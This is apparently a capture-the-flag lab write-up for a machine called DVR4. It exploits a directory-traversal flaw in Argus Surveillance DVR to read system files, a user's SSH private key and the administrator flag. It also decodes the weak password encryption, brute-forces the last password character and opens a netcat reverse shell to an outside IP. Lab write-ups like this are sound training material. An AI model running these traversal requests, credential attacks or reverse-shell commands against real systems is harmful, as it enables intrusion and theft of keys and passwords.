# DVR4

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.201.179
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 14:10 +08
Nmap scan report for 192.168.201.179
Host is up (0.17s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

SSH is open on this Windows machine, so let's take note of that.&#x20;

### Argus Surveillance -> LFI SSH Key

Port 8080 hosted an Argus Surveillance instance:

<figure><img src="../../../.gitbook/assets/image (1766).png" alt=""><figcaption></figcaption></figure>

There are quite a few exploits for this software:

```
$ searchsploit argus                         
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Argus Surveillance DVR 4.0 - Unquoted Service Path         | windows/local/50261.txt
Argus Surveillance DVR 4.0 - Weak Password Encryption      | windows/local/50130.py
Argus Surveillance DVR 4.0.0.0 - Directory Traversal       | windows_x86/webapps/45296.txt
Argus Surveillance DVR 4.0.0.0 - Privilege Escalation      | windows_x86/local/45312.c
----------------------------------------------------------- ---------------------------------
```

The LFI one looks the easiest to exploit, and it involves using `curl`:

{% code overflow="wrap" %}
```
$ curl "http://192.168.201.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]
```
{% endcode %}

It works, so now we just need to find out what to read. I know that SSH is open, so we should be looking for a SSH private key of some user. On the website, we can view the users to see 2:

<figure><img src="../../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

`viewer` is one them, and we can try to read their private key:

```
$ curl "http://192.168.201.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAuuXhjQJhDjXBJkiIftPZng7N999zteWzSgthQ5fs9kOhbFzLQJ5J
Ybut0BIbPaUdOhNlQcuhAUZjaaMxnWLbDJgTETK8h162J81p9q6vR2zKpHu9Dhi1ksVyAP
<TRUNCATED>
```

Using this, we can `ssh` into the machine as `viewer`:

<figure><img src="../../../.gitbook/assets/image (3135).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Password Decryption -> SYSTEM Shell

I tested the LFI in reading the administrator flag, and it actually worked:

{% code overflow="wrap" %}
```
$ curl "http://192.168.201.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FAdministrator%2FDesktop%2fproof.txt&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
<FLAG>
```
{% endcode %}

This means that the application is being run by the administrator instead of `viewer`. There were other exploits that we didn't use yet. I found that the Weak Password Encryption was one of them. This involved reading the password hash from the configuration files of Argus.&#x20;

```
C:\ProgramData\PY_Software\Argus Surveillance DVR>type DVRParams.ini
<TRUNCATED>
LoginName0=Administrator
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8                                    
```

We can decrypt this hash easily using the script:

```
$ python3 50130.py 

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############

[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown
```

The last character is unknown. When looking at the script, it doesn't seem to map special characters within the dictionary. In this case, we can create a wordlist of the special characters.&#x20;

```
$ cat /usr/share/seclists/Fuzzing/special-chars.txt > wordlist.txt
$ sed -i -e 's/^/14WatchD0g/' wordlist.txt
```

Afterwards, we can attempt to brute force the `ssh` access using `hydra`:

```
$ hydra -l administrator -P wordlist.txt 192.168.201.179 ssh
```

However, this didn't work for some reason, so maybe the administrator does not have SSH access. Instead, I brute forced the passwords one by one with `RunasCs.exe` to check which worked.&#x20;

Eventually one worked:

```
C:\Windows\Tasks>.\runasc.exe Administrator 14WatchD0g# whoami                               
[-] RunasCsException: CreateProcessWithLogonW failed with 1326                               
C:\Windows\Tasks>.\runasc.exe Administrator 14WatchD0g$ whoami                               
dvr4\administrator
```

Great! Now we just need to get a reverse shell. The exploits earlier have the `x86` tag, meaning that this is a 32-bit Windows computer and we should be using `nc32.exe` for a reverse shell.

Then, we just need to execute it:

```
C:\Windows\Tasks>.\runasc.exe Administrator 14WatchD0g$ "C:\Windows\Tasks\nc.exe -e cmd.exe 1
92.168.45.191 21"
```

<figure><img src="../../../.gitbook/assets/image (1092).png" alt=""><figcaption></figcaption></figure>
